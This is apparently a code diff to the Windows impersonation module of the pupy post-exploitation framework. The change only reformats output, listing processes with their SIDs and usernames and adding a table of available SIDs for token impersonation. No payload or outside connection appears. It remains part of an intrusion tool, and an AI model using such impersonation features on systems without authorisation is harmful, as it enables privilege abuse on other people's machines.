@@ -2,6 +2,7 @@
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from modules.lib.windows.migrate import migrate
+from pupylib.PupyOutput import Table, MultiPart
 
 __class_name__="ImpersonateModule"
 
@@ -25,14 +26,35 @@ class ImpersonateModule(PupyModule):
 
             sids = ListSids()
 
-            self.table([{
-                'pid': x[0],
-                'process': x[1],
-                'sid': x[2],
-                'username':x[3]
-            } for x in sids], [
-                'pid', 'process', 'username', 'sid'
-            ])
+            process_table = []
+            sids_table = []
+            sids_dict = {}
+
+            for (pid, process, sid, username) in sids:
+                process_table.append({
+                    'pid': pid,
+                    'process': process,
+                    'sid': sid,
+                    'username': username
+                })
+
+                sids_dict[sid] = username
+
+            for sid, username in sids_dict.iteritems():
+                sids_table.append({
+                    'sid': sid,
+                    'username': username
+                })
+
+            self.log(MultiPart([
+                Table(process_table, [
+                    'pid', 'process', 'username', 'sid'
+                ], caption='Process table'),
+
+                Table(sids_table, [
+                    'sid', 'username'
+                ], caption='Available Sids')
+            ]))
 
         elif args.impersonate:
             if args.migrate:
